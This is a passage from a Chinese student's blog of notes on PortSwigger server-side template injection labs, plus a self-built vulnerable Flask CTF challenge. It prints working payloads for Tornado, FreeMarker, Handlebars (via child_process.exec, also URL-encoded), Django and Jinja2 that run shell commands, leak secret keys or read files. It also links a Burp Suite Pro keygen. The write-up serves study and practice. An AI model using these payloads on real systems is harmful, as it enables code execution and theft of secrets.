+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Preferred name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">blog-post-author-display</span> <span class="attr">name</span>=<span class="string">blog-post-author-display</span> <span class="attr">form</span>=<span class="string">blog-post-author-display-form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.name</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.first_name</span> <span class="attr">selected</span>&gt;</span>First Name<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.nickname</span>&gt;</span>Nickname<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>感觉blog-post-author-display 可以被利用（我承认其实是看了wp。。<br>然后因为我电脑之前坏了bp没了之后一直没装回来，所以一直是是hackbar做的，这题本来要用bp截取流量包，但是我用手速hackbar把加载中的&#x2F;my-account&#x2F;change-blog-post-author-display页面load下来了（一开始没看wp时是纯运气好加网慢），但是天有不测风云，，不知道为什么一直卡住，<code>&#123;&#123;7*7&#125;&#125;</code>都不行，我开了wp对着payload试了都不成功，可能最后还是要bp，，所以！明天见！！！！溜了</p>
+<p>等等我在溜之前看了一眼blog发现我一开始打的<br><code>&#123;&#123;7*7&#125;&#125;</code><br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg"><img src="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg"></a><br>因为忘记加反引号使其成为代码形式，发布出来之后变成了49<br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg"><img src="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg"></a><br>然后搜到了Hexo 的模板引擎是默认使用 ejs 编写的<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903490930622471">浅析 Hexo 搭建博客的原理 - 掘金</a><br><a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#docs">EJS – 嵌入式 JavaScript 模板引擎 | EJS 中文文档</a></p>
+<hr>
+<h2 id="Basic-server-side-template-injection-code-context"><a href="#Basic-server-side-template-injection-code-context" class="headerlink" title="Basic server-side template injection (code context)"></a>Basic server-side template injection (code context)</h2><p>搞了半天又看不懂英文又不会用bp。。搜了个wp跟着过了一遍<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/105890491">Server-side template injection (SSTI)学习笔记</a><br>原来在blog-post-author-display注入之后是在评论页面看<del>我说怪不得怎么改accout页面都显示wiener</del><br><a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/template.html">tornado.template — Flexible output generation — Tornado 6.3.2 documentation</a></p>
+<p><code>user.name&#125;&#125;&#123;%25+import+os+%25&#125;&#123;&#123;os.system('rm%20/home/carlos/morale.txt')`
+
+## Server-side template injection using documentation
+登录，没找到什么可利用的，回到主页面打开一个产品页面，查看`Template`
+发现有`$&#123;product.name&#125;` 这种东西
+看了官方给的`@albinowax`这个人的
+[Server-Side Template Injection | PortSwigger Research](https://portswigger.net/research/server-side-template-injection )
+感觉可能是freemarker输个`$&#123;ex("id")&#125;`preview看看
+![](https://pic.imgdb.cn/item/64c783601ddac507ccacc309.jpg)
+[FAQ - FreeMarker 中文官方参考手册](http://freemarker.foofun.cn/app_faq.html )
+
+[Java安全之freemarker 模板注入 - nice_0e3 - 博客园](https://www.cnblogs.com/nice0e3/p/16217471.html )
+
+`<#assign ex="freemarker.template.utility.Execute"?new()> $&#123; ex ("rm /home/carlos/morale.txt")&#125;`
+
+## Server-side template injection in an unknown language with a documented exploit
+看起来跟第一题很像，`&#123;&#123;7*7&#125;&#125;`
+![](https://pic.imgdb.cn/item/64c78a851ddac507ccba8364.jpg)
+问了chat老师它说这是Handlebars模板
+[介绍 | Handlebars 中文文档 | Handlebars 中文网](https://www.handlebarsjs.cn/guide/#%E4%BB%80%E4%B9%88%E6%98%AF-handlebars )
+
+[Handlebars模板注入到RCE 0day-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/176121 )
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return JSON.stringify(process.env);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="keyword">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+怎么所有搜到的wp大家都一下子根据这个片段构造出来payload了，，有没有人教教我这怎么改，，
+勉强理解别人的wp这样。。
+`require('child_process').exec`
+child_process.exec()：衍生一个 shell 并在该 shell 中运行命令，当完成时则将stdout 和 stderr 传给回调函数。
+`%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d`
+
+## Server-side template injection with information disclosure via user-supplied objects
+任务steal and submit the framework's secret key.
+
+跟第三题很像，进入产品Template页，随机挑选幸运`&#123;&#123;&#125;&#125;` 填入`7*7`
+
+见识太少不认识，遇事不决问chatgpt，得知这是Django模板
+[Django 文档 | Django 文档 | Django](https://docs.djangoproject.com/zh-hans/4.2/ )
+
+在官方文档里搜索secret key
+[配置 | Django 文档 | Django](https://docs.djangoproject.com/zh-hans/4.2/ref/settings/ )
+![](https://pic.imgdb.cn/item/64c7baf21ddac507cc138ed0.jpg)
+
+挑选一个幸运`&#123;&#123;&#125;&#125;`改成`&#123;%debug%&#125;</code><br><img src="https://pic.imgdb.cn/item/64c7bbc91ddac507cc154fb2.jpg"></p>
+<p><code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code></p>
+<h2 id="Server-side-template-injection-in-a-sandboxed-environment"><a href="#Server-side-template-injection-in-a-sandboxed-environment" class="headerlink" title="Server-side template injection in a sandboxed environment"></a>Server-side template injection in a sandboxed environment</h2><p>任务break out of the sandbox to read the file my_password.txt from Carlos’s home directory.</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1304/#_3">逃逸安全的模板沙箱（一）——FreeMarker（上）</a><br>非常自信，嘎嘎乱做👍👍👍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;product.getClass()&#125;</span><br><span class="line"><span class="comment">//  class lab.actions.templateengines.FreeMarkerProduct</span></span><br><span class="line">------</span><br><span class="line">$&#123;product.getClass().getProtectionDomain()&#125;</span><br><span class="line"><span class="comment">// ProtectionDomain (file:/opt/jars/freemarker.jar &lt;no signer certificates&gt;) jdk.internal.loader.ClassLoaders$AppClassLoader@4e7dc304 &lt;no principals&gt; java.security.Permissions@6f27a732 ( (&quot;java.lang.RuntimePermission&quot; &quot;exitVM&quot;) (&quot;java.io.FilePermission&quot; &quot;/opt/jars/freemarker.jar&quot; &quot;read&quot;) )</span></span><br><span class="line">------</span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getClassLoader()&#125;</span><br><span class="line"><span class="comment">// jdk.internal.loader.ClassLoaders$AppClassLoader@4e7dc304</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">// 大错特错！！</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getClassLoader().getResourceAsStream(<span class="string">&#x27;/home/carlos/my_password.txt&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>显然，最后一句是错的，去搜了个<code>getProtectionDomain()</code><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yu102655/article/details/112347600">getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getSchemeSpecificPart()返回内容解析</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource()&#125;</span><br><span class="line"><span class="comment">// (file:/opt/jars/freemarker.jar &lt;no signer certificates&gt;) </span></span><br><span class="line">------<span class="number">5</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation()&#125;</span><br><span class="line"><span class="comment">// file:/opt/jars/freemarker.jar</span></span><br><span class="line">------<span class="number">6</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()&#125;</span><br><span class="line"><span class="comment">// file:/opt/jars/freemarker.jar</span></span><br><span class="line">------<span class="number">7</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getSchemeSpecificPart()&#125;</span><br><span class="line"><span class="comment">// /opt/jars/freemarker.jar</span></span><br></pre></td></tr></table></figure>
+<p>好了又卡住了，，其实我一开始是尝试去看java官方文档的，不知道是不是我的问题（肯定是我的问题吧🥲🥲🥲），不是没中文版的就是乱糟糟的，，，还有既没翻译又乱糟糟的</p>
+<p>看了官方payload<br><code>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code><br>也不细讲🥲🥲🥲，感觉这种题对我一个java了解为0的来说太过了，感觉我现在的水平就是看个思（乐）路（子）。</p>
+<p>然后解ascii</p>
+<h2 id="Server-side-template-injection-with-a-custom-exploit"><a href="#Server-side-template-injection-with-a-custom-exploit" class="headerlink" title="Server-side template injection with a custom exploit"></a>Server-side template injection with a custom exploit</h2><p>好复杂，利用文件上传干嘛来着</p>
+<p>随机一个文档看看实力</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught <span class="built_in">Exception</span>: Uploaded file mime type is not an image: application/vnd.openxmlformats-officedocument.wordprocessingml.document in /home/carlos/User.php:<span class="number">28</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar(&#x27;/tmp/11.docx&#x27;, &#x27;application/vnd...&#x27;)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line">  thrown in /home/carlos/User.php on line <span class="number">28</span></span><br></pre></td></tr></table></figure>
+<p>大概就是&#x2F;home&#x2F;carlos&#x2F;avatar_upload.php文件调用了setAvatar方法<br>然后会检查上传的文件的MIME类型是否是图片类型</p>
+<hr>
+<p>有点晕，不过比上一题清晰点，回头再做</p>
+<h1 id="ssti出题尝试"><a href="#ssti出题尝试" class="headerlink" title="ssti出题尝试"></a>ssti出题尝试</h1><p>感谢chat老师。。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;title&gt;Greetings&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello, &#123;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;flag in flag.txt&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use Python 3 as the base image</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the app files to the container&#x27;s /app directory</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.py /app/app.py</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /app/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the working directory</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install Flask library</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install Flask</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose port 5000 (Flask application will run on this port)</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the Flask application</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44786530/article/details/123401289">Docker部署127.0.0.1服务后访问不了？解决方法</a></p>
+<p>本来想搞个过滤，但是懒得搞了，就当们是签到题吧！</p>
+<p>搞点背景和字体，，体现一下我真的有在学习（？<br>本来想直接偷懒写在app.py内（内嵌样式表），结果css的花括号会占位符还是什么，与和chatgpt辩论三百回合遂罢；把css放在static文件夹内，然后不知道为什么调用路径总是出错，和chatgpt辩论三百回合再罢，最后用内联样式嵌进去。。<br><a target="_blank" rel="noopener" href="http://c.biancheng.net/css3/html-import-css.html">HTML引用CSS（4种方法）</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;你好你好你好&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body style=&quot;font-size: 49px; text-shadow: 2px 2px 4px #777; padding: 50px;</span></span><br><span class="line"><span class="string">            background-image: url(&#x27;https://pic.imgdb.cn/item/64c912851ddac507cc745f87.jpg&#x27;);</span></span><br><span class="line"><span class="string">            background-size: cover; background-repeat: no-repeat; background-position: center;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 style=&quot;font-family: &#x27;Edwardian Script ITC&#x27;; font-size: 56px; color: #333;&quot;&gt;Hello, &#123;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p style=&quot;font-style: italic; font-family: &#x27;Blackadder ITC&#x27;; font-size: 25px; color: #3D4456;&quot;&gt;flag in flag.txt&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>payload(显然不唯一。。): <code>?user=&#123;&#123;''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['open']('flag.txt').read()&#125;&#125;</code></p>
+<h1 id="啥不知道有没有用的链接堆堆"><a href="#啥不知道有没有用的链接堆堆" class="headerlink" title="啥不知道有没有用的链接堆堆"></a>啥不知道有没有用的链接堆堆</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/625023925">国内十大图床推荐–一文解决图片图床问题 - 知乎</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14797393.html">SSTI(模板注入)–Flask(萌新向) | [BUUCTF题解][CSCCTF 2019 Qual]FlaskLight &amp; [GYCTF2020]FlaskApp（SSTI） - Article_kelp - 博客园</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11971164.html">python-flask模块注入(SSTI) - ctrl_TT豆 - 博客园</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhaijiahui/p/9160913.html">CEYE平台的使用 - 时光不改 - 博客园</a><br><a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - Monitor service for security testing</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54515836/article/details/113778233">ssti详解与例题以及绕过payload大全</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/111503731">SSTI入门详解</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43936524/article/details/116306294">从Flask入门SSTI</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/125398979">SSTI靶场</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44576725/article/details/124176682">flask sssti lab闯关记录</a><br><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LAB攻略 – JohnFrod’s Blog</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_16307345/article/details/115718727">读取pkl文件报错_pickle.UnpicklingError: A load persistent id instruction was encountered</a><br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/44549856/no-module-named-ttk-but-its-in-the-folder">python - no module named ‘ttk’, but its in the folder - Stack Overflow</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/29440823">手把手教你如何完成Ruby ERB模板注入 - 知乎</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013541325/article/details/109336900">Burpsuite超详细安装教程</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/article/details/122393296">BurpSuite全套使用教程（超实用超详细介绍）</a><br><a target="_blank" rel="noopener" href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">h3110w0r1d-y&#x2F;BurpLoaderKeygen: Burp Suite Pro Loader &amp; Keygen</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/burp/releases">Burp Suite Release Notes</a><br><a target="_blank" rel="noopener" href="https://greasyfork.org/zh-CN/scripts/463707-%E5%B0%B1%E6%98%AF%E5%8A%A0%E9%80%9F-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%97%A0%E9%99%90%E9%80%9F%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD-%E6%94%AF%E6%8C%81%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E8%BD%BD">🔥【就是加速】百度网盘无限速批量下载 - 支持文件夹下载 🔥</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64205442">Node.js中child_process模块中spawn与exec的异同比较 - 知乎</a><br><a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/4.2/ref/templates/builtins/">内置模板标签和过滤器 | Django 文档 | Django</a><br><a target="_blank" rel="noopener" href="https://geek-docs.com/django/django-questions/239_django_django_global_variable.html">Django 全局变量|极客教程</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/8047530.html">巧用DNSlog实现无回显注入 - Afant1 - 博客园</a><br><a target="_blank" rel="noopener" href="http://www.admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">无回显代码执行利用方法 | AdminTony’s Blog</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/228176">浅析Python SSTI&#x2F;沙盒逃逸-安全客 - 安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/331653.html">从0到1完全掌握 SSTI - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/105890491">Server-side template injection (SSTI)学习笔记</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/107727952?spm=1001.2101.3001.6650.7&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7-107727952-blog-105890491.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7-107727952-blog-105890491.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=8">服务器模板注入 SSTI （Server-side template injection）</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/331653.html">从0到1完全掌握 SSTI - FreeBuf网络安全行业门户</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i> crypto</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/27/imaginaryctf%E9%83%A8%E5%88%86wp%EF%BC%88%E5%8F%AA%E6%9C%89%E4%B8%80%E7%82%B9%E7%82%B9%E3%80%82%E3%80%82/" rel="prev" title="imaginaryctf部分wp">
+      <i class="fa fa-chevron-left"></i> imaginaryctf部分wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/28/xCTF-2023-wp-%E9%83%A8%E5%88%86/" rel="next" title="_*CTF_2023_wp_部分">
+      _*CTF_2023_wp_部分 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
